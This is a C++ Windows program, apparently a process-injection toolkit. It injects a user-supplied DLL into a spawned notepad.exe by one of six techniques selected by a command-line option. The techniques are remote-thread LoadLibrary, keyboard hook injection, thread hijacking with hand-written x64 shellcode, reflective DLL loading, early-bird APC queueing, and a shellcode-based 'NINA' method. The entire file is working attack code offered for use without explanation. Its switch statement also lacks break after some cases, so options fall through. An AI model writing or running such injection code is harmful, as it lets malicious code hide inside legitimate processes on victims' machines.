#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <winternl.h>
#include "nina.h"
using namespace std;
string dllPath;
int pathSize;



void CreateThread() { 
	PVOID remoteBuffer;
	HANDLE processHandle;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	//processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 19948 );
	processHandle = pi.hProcess;
	remoteBuffer = VirtualAllocEx(processHandle, NULL, pathSize, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, dllPath.c_str(), pathSize, NULL);
	Sleep(1000);
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");
	HANDLE check = CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
}


void WindowsAPIHooking() {
	PVOID remoteBuffer;
	HANDLE processHandle;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	Sleep(1000);
	/* Main process */
	HMODULE library = LoadLibraryA(dllPath.c_str());
	HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, "ExecShellCode");
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookProc, library, pi.dwThreadId);
	Sleep(10 * 1000);
	UnhookWindowsHookEx(hook);
}

void InjectingRemoteProcessViaThreadHijacking() {
	PVOID remoteBuffer;
	HANDLE processHandle, threadHijacked;
	THREADENTRY32 threadEntry;
	CONTEXT context;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	Sleep(1000);

	processHandle = pi.hProcess;
	threadHijacked = pi.hThread;

	remoteBuffer = VirtualAllocEx(processHandle, NULL, pathSize+256, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, (LPBYTE)remoteBuffer+256, dllPath.c_str(), pathSize, NULL);

	SuspendThread(threadHijacked);
	context.ContextFlags = CONTEXT_FULL;
	GetThreadContext(threadHijacked, &context);

	BYTE codeToBeInjected[] = {
		// sub rsp, 28h
		0x48, 0x83, 0xec, 0x28,
		// mov [rsp + 18h], rax
		0x48, 0x89, 0x44, 0x24, 0x18,
		// mov [rsp + 10h], rcx
		0x48, 0x89, 0x4c, 0x24, 0x10,
		// mov rcx, 11111111111111111h; placeholder for DLL path
		0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
		// mov rax, 22222222222222222h; placeholder for “LoadLibraryW” address
		0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
		// call rax
		0xff, 0xd0,
		// mov rcx, [rsp + 10h]
		0x48, 0x8b, 0x4c, 0x24, 0x10,
		// mov rax, [rsp + 18h]
		0x48, 0x8b, 0x44, 0x24, 0x18,
		// add rsp, 28h
		0x48, 0x83, 0xc4, 0x28,
		// mov r11, 333333333333333333h; placeholder for the original RIP
		0x49, 0xbb, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
		// jmp r11
		0x41, 0xff, 0xe3
	};

	// Set the DLL path
	*reinterpret_cast<PVOID*>(codeToBeInjected + 0x10) = static_cast<void*>((LPBYTE)remoteBuffer + 256);
	// Set LoadLibraryW address
	*reinterpret_cast<PVOID*>(codeToBeInjected + 0x1a) = static_cast<void*>(GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"));
	// Jump address (back to the original code)
	*reinterpret_cast<PVOID*>(codeToBeInjected + 0x34) = (PVOID)context.Rip;
	context.Rip = reinterpret_cast<DWORD_PTR>(remoteBuffer);
	WriteProcessMemory(processHandle, (LPBYTE)remoteBuffer, codeToBeInjected, sizeof(codeToBeInjected), NULL);
	SetThreadContext(threadHijacked, &context);
	ResumeThread(threadHijacked);
}


typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);

void ReflectiveDLLInjection() {
	PVOID imageBase = GetModuleHandleA(NULL);

	// load DLL into memory
	HANDLE dll = CreateFileA(dllPath.c_str(), GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD64 dllSize = GetFileSize(dll, NULL);
	LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
	DWORD outSize = 0;
	ReadFile(dll, dllBytes, dllSize, &outSize, NULL);

	// get pointers to in-memory DLL headers
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

	// allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere
	//LPVOID dllBase = VirtualAlloc((LPVOID)0x000000191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// get delta between this module's image base and the DLL that was read into memory
	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

	// copy over DLL image headers to the newly allocated space for the DLL
	std::memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);

	// copy over DLL image sections to the newly allocated space for the DLL
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
		LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
		std::memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
		section++;
	}

	// perform image base relocations
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
	DWORD relocationsProcessed = 0;

	while (relocationsProcessed < relocations.Size)
	{
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

		for (DWORD i = 0; i < relocationsCount; i++)
		{
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

			if (relocationEntries[i].Type == 0)
			{
				continue;
			}

			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
			addressToPatch += deltaImageBase;
			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
		}
	}

	// resolve import address table
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
	LPCSTR libraryName = "";
	HMODULE library = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
		library = LoadLibraryA(libraryName);

		if (library)
		{
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
					thunk->u1.Function = functionAddress;
				}
				++thunk;
			}
		}

		importDescriptor++;
	}

	// execute the loaded DLL
	DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

	CloseHandle(dll);
	HeapFree(GetProcessHeap(), 0, dllBytes);
}

void EarlyBirdApcQueueDllInjection() {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;
	
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, pathSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");
	//PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(victimProcess, shellAddress, dllPath.c_str(), pathSize, NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, (ULONG_PTR)shellAddress);
	ResumeThread(threadHandle);
}

void NINA() {
	BYTE Shellcode[] = {
		//
		// 8 bytes for RET gadget.
		//
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
		//
		// 40 bytes Shadow stack. 
		//
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		//
		// Real shellcode
		//
		// sub rsp, 28h
		0x48, 0x83, 0xec, 0x28,
		// mov [rsp + 18h], rax
		0x48, 0x89, 0x44, 0x24, 0x18,
		// mov [rsp + 10h], rcx
		0x48, 0x89, 0x4c, 0x24, 0x10,
		// mov rcx, 11111111111111111h; placeholder for DLL path
		0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
		// mov rax, 22222222222222222h; placeholder for “LoadLibraryW” address
		0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
		// call rax
		0xff, 0xd0,
		// mov rcx, [rsp + 10h]
		0x48, 0x8b, 0x4c, 0x24, 0x10,
		// mov rax, [rsp + 18h]
		0x48, 0x8b, 0x44, 0x24, 0x18,
		// add rsp, 28h
		0x48, 0x83, 0xc4, 0x28,
		//
		// 80 bytes dllPath
		//
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	};
	// Set the DLL path
	*reinterpret_cast<PVOID*>(Shellcode + 0x40) = static_cast<void*>((LPBYTE)Shellcode+100);
	// Set LoadLibraryW address
	*reinterpret_cast<PVOID*>(Shellcode + 0x4a) = static_cast<void*>(GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"));
	memcpy(Shellcode+100, dllPath.c_str(), pathSize);
	//
	// Do whatever you need to do here to get a target
	// process and thread handle.
	//
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	VirtualAllocEx(pi.hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	InjectPayload(
		pi.hProcess,
		pi.hThread,
		Shellcode,
		sizeof(Shellcode),
		TRUE
	);
}
int main(int argv, char* argc[])
{
	int option = atoi(argc[2]);

	dllPath = string(argc[1]);
	pathSize = dllPath.size();
	switch (option) {
	case 1:
		CreateThread();
		break;
	case 2:
		WindowsAPIHooking();
		break;
	case 3:
		InjectingRemoteProcessViaThreadHijacking();
		break;
	case 4:
		ReflectiveDLLInjection();
	case 5:
		EarlyBirdApcQueueDllInjection();
	case 6:
		NINA();
	}
}

